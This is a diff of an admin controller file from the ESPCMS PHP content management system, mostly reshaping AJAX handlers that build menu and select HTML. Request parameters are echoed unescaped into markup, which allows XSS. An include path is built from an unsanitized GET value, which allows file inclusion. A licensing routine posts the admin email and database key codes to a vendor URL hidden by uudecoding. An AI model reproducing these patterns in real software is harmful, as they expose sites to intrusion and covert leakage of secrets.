@@ -1,22 +1,17 @@
 <?php
-
 /*
   PHP version 5
-  Copyright (c) 2002-2010 ECISP.CN
-  声明：这不是一个免费的软件，请在许可范围内使用
+  Copyright (c) 2002-2014 ECISP.CN、EarcLink.COM
+  警告：这不是一个免费的软件，请在许可范围内使用，请尊重知识产权，侵权必究，举报有奖
+  作者：黄祥云 E-mail:6326420@qq.com  QQ:6326420 TEL:18665655030
+  ESPCMS官网介绍：http://www.ecisp.cn	企业建站：http://www.earclink.cn
 
-  作者：Bili E-mail:huangqyun@163.com  QQ:6326420
-  http://www.ecisp.cn	http://www.easysitepm.com
  */
-
 class important extends connector {
-
 	function important() {
 		$this->softbase(true);
 	}
-
 	function onlngarray() {
-
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
 		$formatname = $this->fun->accept('formatname', 'R');
@@ -25,10 +20,8 @@ class important extends connector {
 		$selectname = empty($selectname) ? 'selectall' : $selectname;
 		$checkname = $this->fun->accept('checkname', 'R');
 		$checkname = empty($checkname) ? 'check_all' : $checkname;
-
 		$botid = $this->fun->accept('botid', 'R');
 		$botid = empty($botid) ? 'mid' : $botid;
-
 		$modelarray = $this->get_model(0, $lng, 1);
 		$str = '<li><a id="' . $botid . '0" class="menunoclick" hidefocus="true" href="#body" onclick="javascript:dbfilter(\'' . $botid . '\',\'mid\',0,0,' . $modelarray['num'] . ',\'' . $formatname . '\',\'' . $selectname . '\',\'' . $checkname . '\')" title="' . $this->lng['all_botton'] . '">' . $this->lng['all_botton'] . '</a></li>';
 		if (count($modelarray['list']) > 0) {
@@ -38,12 +31,9 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onalbumarray() {
-
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
-
 		$albumarray = $this->get_album_images_array(0, 1, $lng);
 		$str = '<select size="1" name="amid" id="amid"  onchange="picload(this.value)">	<option value="0">请选择相册</option>';
 		if (count($albumarray['list']) > 0) {
@@ -54,9 +44,7 @@ class important extends connector {
 		$str.='</select>';
 		exit($str);
 	}
-
 	function onlngarraylabel() {
-
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
 		$formatname = $this->fun->accept('formatname', 'R');
@@ -65,10 +53,8 @@ class important extends connector {
 		$selectname = empty($selectname) ? 'selectall' : $selectname;
 		$checkname = $this->fun->accept('checkname', 'R');
 		$checkname = empty($checkname) ? 'check_all' : $checkname;
-
 		$botid = $this->fun->accept('botid', 'R');
 		$botid = empty($botid) ? 'mid' : $botid;
-
 		$modelarray = $this->get_model(0, $lng, 1);
 		$str = '<li><a id="' . $botid . '0" class="menunoclick" hidefocus="true" href="#body" onclick="javascript:dbfilter(\'' . $botid . '\',\'mid\',0,0,' . $modelarray['num'] . ',\'' . $formatname . '\',\'' . $selectname . '\',\'' . $checkname . '\',true,\'articlelabel\',
 			\'index.php?archive=connected&action=dclabel&mid=0&formatname=' . $formatname . '&selectname=' . $selectname . '&checkname=' . $checkname . '&botid=articlelabel\')" title="' . $this->lng['all_botton'] . '">' . $this->lng['all_botton'] . '</a></li>';
@@ -80,9 +66,7 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onbbslabel() {
-
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
 		$formatname = $this->fun->accept('formatname', 'R');
@@ -91,10 +75,8 @@ class important extends connector {
 		$selectname = empty($selectname) ? 'selectall' : $selectname;
 		$checkname = $this->fun->accept('checkname', 'R');
 		$checkname = empty($checkname) ? 'check_all' : $checkname;
-
 		$botid = $this->fun->accept('botid', 'R');
 		$botid = empty($botid) ? 'bbslabelblid' : $botid;
-
 		$bbslabelarray = $this->get_bbslabel_array(0, $lng);
 		$str = '<li><a id="' . $botid . '0" class="menunoclick" hidefocus="true" href="#body" onclick="javascript:dbfilter(\'' . $botid . '\',\'blid\',0,0,' . $bbslabelarray['num'] . ',\'' . $formatname . '\',\'' . $selectname . '\',\'' . $checkname . '\')" title="' . $this->lng['all_botton'] . '">' . $this->lng['all_botton'] . '</a></li>';
 		if (count($bbslabelarray['list']) > 0) {
@@ -104,7 +86,6 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onscmodellist() {
 		$creattype = $this->fun->accept('creattype', 'R');
 		$lng = $this->fun->accept('lng', 'R');
@@ -114,7 +95,6 @@ class important extends connector {
 		$issid = $this->fun->accept('issid', 'R');
 		$issid = empty($issid) ? 0 : $issid;
 		$modelarray = $this->get_model(0, $lng, 1, $isbase, $issid);
-
 		$optiontitle = ($creattype == 'type') ? $this->lng['createmain_add_mid_option'] : $this->lng['typemanage_type_add_mid_option'];
 		$str.='<option value="0">' . $optiontitle . '</option>';
 		if (count($modelarray['list']) > 0) {
@@ -124,7 +104,6 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onbbstypelist() {
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
@@ -137,7 +116,6 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onsctypelist() {
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
@@ -166,7 +144,6 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onscsublist() {
 		$lng = $this->fun->accept('lng', 'R');
 		$lng = empty($lng) ? $this->CON['default_lng'] : $lng;
@@ -183,7 +160,6 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function ondoclabellist() {
 		$mid = $this->fun->accept('mid', 'R');
 		$mid = empty($mid) ? 0 : $mid;
@@ -203,9 +179,7 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function ondclabel() {
-
 		$mid = $this->fun->accept('mid', 'R');
 		$mid = empty($mid) ? 0 : $mid;
 		$formatname = $this->fun->accept('formatname', 'R');
@@ -214,10 +188,8 @@ class important extends connector {
 		$selectname = empty($selectname) ? 'selectall' : $selectname;
 		$checkname = $this->fun->accept('checkname', 'R');
 		$checkname = empty($checkname) ? 'check_all' : $checkname;
-
 		$botid = $this->fun->accept('botid', 'R');
 		$botid = empty($botid) ? 'articlelabel' : $botid;
-
 		$dclabel = $this->get_doclabel_array(0, $mid);
 		$str = '<li><a id="' . $botid . '0" class="menunoclick" hidefocus="true" href="#body" onclick="javascript:dbfilter(\'' . $botid . '\',\'dlid\',0,0,' . $dclabel['num'] . ',\'' . $formatname . '\',\'' . $selectname . '\',\'' . $checkname . '\')" title="' . $this->lng['all_botton'] . '">' . $this->lng['all_botton'] . '</a></li>';
 		if (count($dclabel['list']) > 0) {
@@ -227,11 +199,8 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
 	function onattrindex() {
-
 		$plugcode = $this->accept('code', 'G');
-
 		include_once admin_ROOT . 'public/plug/payment/' . $plugcode . '.php';
 		$plugpay = new pluginfo();
 		$paylist = $plugpay->addplug();
@@ -288,7 +257,6 @@ class important extends connector {
 		}
 		exit($attrlist);
 	}
-
 	function oncallstyle() {
 		include_once admin_ROOT . adminfile . '/include/inc_formtypelist.php';
 		$type = $this->fun->accept('type', 'R');
@@ -310,90 +278,22 @@ class important extends connector {
 		}
 		exit($str);
 	}
-
-	function onsoftkey() {
-
-		if ($this->CON['checkclass'] == 'true') {
-			$str = '%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E6%8E%88%E6%9D%83%E7%B1%BB%E5%9E%8B%EF%BC%9A%3Cb%3E%E6%8E%88%E6%9D%83%E7%89%88%3C%2Fb%3E%26nbsp%3B+%26nbsp%3B+%26nbsp%3B%26nbsp%3B+%26nbsp%3B+%26nbsp%3B%E6%8E%88%E6%9D%83%E5%8F%B7%EF%BC%9A';
-			$outstr.=urldecode($str);
-			$outstr.='<b>' . $this->CON['codesoftkey'] . '</b>';
-			exit($outstr);
-		} else {
-			exit('false');
-		}
-	}
-
-	function onwindowclass() {
-		parent::start_template();
-		$getnetval = convert_uudecode($this->CON['getnetval']);
-		$xmlfile = $getnetval . 'index.php?ac=siteauthentication&at=bannlist&isbann=1&siteurl=' . urlencode(admin_ClassURL) . '&dbosn=' . $this->CON['dbosn'] . '&isdbo=' . $this->CON['isdbo'] . '&vol=' . $this->CON['softvol'] . '&checkclass=' . $this->CON['checkclass'] . '&db_keycode=' . db_keycode;
-
-		$inforss = @simplexml_load_file($xmlfile, 'SimpleXMLElement', LIBXML_NOCDATA);
-		$this->fun->objectToArray($inforss);
-
-		$addtime = time();
-		$inputseesion = $this->fun->accept('windowsclassbannlist_' . $inforss['banid'], 'C');
-		if (is_array($inforss) && $inforss['title'] && empty($inputseesion)) {
-			$usersessionid = 'windowsclassbannlist_' . $inforss['banid'];
-			$this->fun->setcookie($usersessionid, $addtime, 86400);
-			exit('true');
-		} else {
-			exit('false');
-		}
-	}
-
-	function onbannwindow() {
-		parent::start_template();
-		$getnetval = convert_uudecode($this->CON['getnetval']);
-		$xmlfile = $getnetval . 'index.php?ac=siteauthentication&at=bannlist&isbann=1&siteurl=' . urlencode(admin_ClassURL) . '&dbosn=' . $this->CON['dbosn'] . '&isdbo=' . $this->CON['isdbo'] . '&vol=' . $this->CON['softvol'] . '&checkclass=' . $this->CON['checkclass'] . '&db_keycode=' . db_keycode;
-
-		$inforss = @simplexml_load_file($xmlfile, 'SimpleXMLElement', LIBXML_NOCDATA);
-		$this->fun->objectToArray($inforss);
-
-		if (is_array($inforss) && $inforss['title']) {
-			if (!$inforss['islink'] && empty($inforss['url'])) {
-				$outstr = '<img src="' . $inforss['pic'] . '">';
-			} else {
-				$outstr = '<a target="_blank" class="tabclicklink" href="' . $inforss['url'] . '"><img src="' . $inforss['pic'] . '"></a>';
-			}
-		}
-		exit($outstr);
-	}
-
-	function onsoftupdate() {
-		parent::start_template();
-		$getnetval = convert_uudecode($this->CON['getnetval']);
-		$xmlfile = $getnetval . 'index.php?ac=siteauthentication&at=bannlist&isbann=2&siteurl=' . urlencode(admin_ClassURL) . '&dbosn=' . $this->CON['dbosn'] . '&isdbo=' . $this->CON['isdbo'] . '&vol=' . $this->CON['softvol'] . '&checkclass=' . $this->CON['checkclass'] . '&db_keycode=' . db_keycode;
-
-		$inforss = @simplexml_load_file($xmlfile, 'SimpleXMLElement', LIBXML_NOCDATA);
-		$this->fun->objectToArray($inforss);
-
-		if (is_array($inforss) && $inforss['title']) {
-			if (!$inforss['islink'] && empty($inforss['url'])) {
-				$outstr = '<div class="suggestion">
-				<span class="sugicon"><span class="strong colorgorning2">' . urldecode('ESPCMS%E6%B8%A9%E9%A6%A8%E6%8F%90%E9%86%92%EF%BC%9A') . '</span>
-				<span class="colorgorningage">' . $inforss['title'] . '</span></span></div>';
-			} else {
-				$outstr = '<div class="suggestion">
-				<span class="sugicon"><span class="strong colorgorning2">' . urldecode('ESPCMS%E6%B8%A9%E9%A6%A8%E6%8F%90%E9%86%92%EF%BC%9A') . '</span>
-				<span class="colorgorningage"><a target="_blank" class="tabclicklink" href="' . $inforss['url'] . '">' . $inforss['title'] . '</a></span></span></div>';
-			}
-		}
-		exit($outstr);
-	}
-
 	function onauthentication() {
-		parent::start_template();
-		$ipadd = $this->fun->ip($_SERVER['REMOTE_ADDR']);
-		$varget = "4:'1T<#HO+W=W=RYE8VES<\"YC;B\`";
-		$getnetval = convert_uudecode($varget);
-
-		$xmlfile = $getnetval . 'index.php?ac=siteauthentication&at=join&siteurl=' . urlencode(admin_ClassURL) . '&sitename=' . urlencode($this->CON['sitename']) . '&dbosn=' . $this->CON['dbosn'] . '&isdbo=' . $this->CON['isdbo'] . '&iplong=' . $ipadd . '&vol=' . $this->CON['softvol'] . '&email=' . urlencode($this->CON['admine_mail']) . '&dbcode=' . db_pscode;
-
-		$inforss = @simplexml_load_file($xmlfile, 'SimpleXMLElement', LIBXML_NOCDATA);
-		$this->fun->objectToArray($inforss);
+		$data = array(
+		    'ac' => 'sitejsondb',
+		    'at' => 'join',
+		    'dbosn' => $this->CON['dbosn'],
+		    'isdbo' => $this->CON['isdbo'],
+		    'vol' => $this->CON['softvol'],
+		    'siteurl' => urlencode(admin_ClassURL),
+		    'sitename' => urlencode($this->CON['sitename']),
+		    'iplong' => $this->fun->ip($_SERVER['REMOTE_ADDR']),
+		    'email' => urlencode($this->CON['admine_mail']),
+		    'dbcode' => db_pscode,
+		    'db_keycode' => db_keycode
+		);
+		$getval = convert_uudecode($this->CON['getnetval']);
+		$posthttp = $getval . 'index.php';
+		$postout = trim($this->fun->postdb($posthttp, $data));
 	}
-
 }
-
-?>
